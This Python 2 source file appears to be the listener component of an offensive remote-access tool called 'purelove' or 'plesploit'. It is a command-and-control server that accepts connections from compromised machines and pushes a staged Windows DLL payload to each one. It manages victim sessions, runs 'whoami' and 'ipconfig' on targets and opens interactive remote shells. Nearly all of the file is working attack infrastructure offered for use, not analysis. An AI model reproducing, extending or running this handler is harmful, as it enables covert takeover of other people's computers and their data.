#!/usr/bin/env python
# -*- coding: utf-8 -*-
#

#
# https://github.com/hucmosin/purelove
#

import argparse
import readline
import socket
import sys
import time
import threading
from core import starger


CLIENT_COMMANDS = ['shell', 'getuid', 'ipconfig']

HELP_TEXT = '''

Server Command
==============

Command               Description
-------               -----------
session <id>          Connect to a client.
sessions              List connected clients.
help                  Show this help menu.
kill                  Kill the client connection.
quit                  Exit the server.

Client Command
==============

Command               Description
-------               -----------
getuid                Get Client OS Whoami.
ipconfig              Get Client OS eth infomations
shell                 Execute a command on the target,get os shell.
'''



#开启监听服务
class Server(threading.Thread):
    clients      = {}
    buf          = 1024
    client_count = 1
    current_flag = True
    current_client = None  

    def __init__(self,host, port):
        super(Server, self).__init__()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
        self.s.bind((host, port))
        self.s.listen(10)
        
    def run(self):
        while True:
            conn, addr = self.s.accept()  
            client_id = self.client_count 
            client = ClientConnection(conn, addr, uid=client_id)
            self.send_starge(client)
            self.clients[client_id] = client #加入session[]
            self.client_count += 1  
    #发送starge
    def send_starge(self,client):
        dll_len,dll_data = starger.get_win_rple()
        client.conn.send(dll_len)
        time.sleep(2)
        client.conn.send(dll_data)
        
    #发送数据
    def send_client(self, message, client):
        try:
            message += '\n'
            client.conn.send(message)
        except Exception as e:
            print '[!] Error: {}'.format(e) 

    #接收返回数据
    def recv_client(self, client):
        try:
            #循环接收所有数据
            recv_len = 1  
            response = ''
            while recv_len:
                data = client.conn.recv(1024)
                recv_len = len(data)  
                response += data  
                if recv_len < 1024:
                    break
            print response,
            #返回数据
        except Exception as e:
            print '[!] Error: {}'.format(e)

    #选择session
    def select_client(self, client_id):
        try:
            self.current_client = self.clients[int(client_id)] 
            print '[*] Client {} selected.'.format(client_id)
        except (KeyError, ValueError):
            print '[!] Error: Invalid Client ID.'
            
    #移除连接
    def remove_client(self, key):
        return self.clients.pop(key, None)

    #断开连接
    def kill_client(self, _):
        self.send_client('kill', self.current_client) 
        self.current_client.conn.close()              
        self.remove_client(self.current_client.uid)   
        self.current_client = None                    

    
    #获取当前连接数
    def get_clients(self):
        return [v for _, v in self.clients.items()]

    def exec_shell(self,server):
        '''
        @本函数需传入一个socket套接字，因为为了与windows下的命令管道相连接，配合本监听程序
        '''
        from core import nc_cmd_shell
        nc_cmd_shell.nc(server)
    
    #打印连接数
    def list_clients(self, _):
        print 'ID   Client Address'
        print '--   --------------'
        for k, v in self.clients.items():
            print '{:>2}   {}'.format(k, v.addr[0])

    #退出监听服务端
    def quit_server(self, _):
        if raw_input(u'是否退出 (y/N)? ').startswith('y'):
            for c in self.get_clients():
                self.send_client('kill', c)    
            self.s.shutdown(socket.SHUT_RDWR)   
            self.s.close()
            sys.exit(0)

    #打印帮助
    def print_help(self, _):
        print HELP_TEXT

#连接交换初始化
class ClientConnection():
    def __init__(self, conn, addr, uid=0):
        self.conn  = conn
        self.addr  = addr
        self.uid   = uid


#启动监听
def run_handler(host,port):
    client = None
    send_cmd = ""
    flag = False
    
    server = Server(host,port)
    server.setDaemon(True)
    server.start()
    print '[*] Purelove server {host} listening on port {port}.'.format(host = host,
                                                                        port = port)
    #server监听命令
    server_commands = {
        'session':       server.select_client,
        'sessions':      server.list_clients,
        'help':          server.print_help,
        'kill':          server.kill_client,
        'quit':          server.quit_server,
    }

    #tab键监听
    def completer(text, state):
        commands = CLIENT_COMMANDS + [k for k, _ in server_commands.items()]

        options = [i for i in commands if i.startswith(text)]
        if state < len(options):
            return options[state] + ' '
        else:
            return None

    readline.parse_and_bind('tab: complete')
    readline.set_completer(completer)
    
    #开始循环监听连接
    while True:
        if server.current_flag == True:
            #初始化接收参数数据
            prompt = ""
            #当有连接时，进行操作
            if Server.clients:
                if server.current_client:
                    ccid = server.current_client.uid
                else:
                    ccid = '?'
                #对shell进行操作
                prompt = raw_input('plesploit {}> '.format(ccid)).rstrip()
                if not prompt:
                    continue
                    
                cmd, _, action = prompt.partition(' ')

                if cmd in server_commands:
                    server_commands[cmd](action)

                elif cmd in CLIENT_COMMANDS:
                    if ccid == '?':
                        print '[-] Error: No client selected.'
                        continue
        
                    if cmd == "shell":
                        send_cmd = "shell"
                        server.send_client(send_cmd, server.current_client)
                        server.exec_shell(server)
                        server.current_flag = False
                    elif cmd == "getuid":
                        send_cmd = "whoami"
                        server.send_client(send_cmd, server.current_client)
                        server.recv_client(server.current_client)
                    elif cmd == "ipconfig":
                        send_cmd = "ipconfig"
                        server.send_client(send_cmd, server.current_client)
                        server.recv_client(server.current_client)
                    else:
                        print '[!] Invalid command, type "help" to see a list of commands.'
                else:
                    print '[!] Invalid command, type "help" to see a list of commands.'

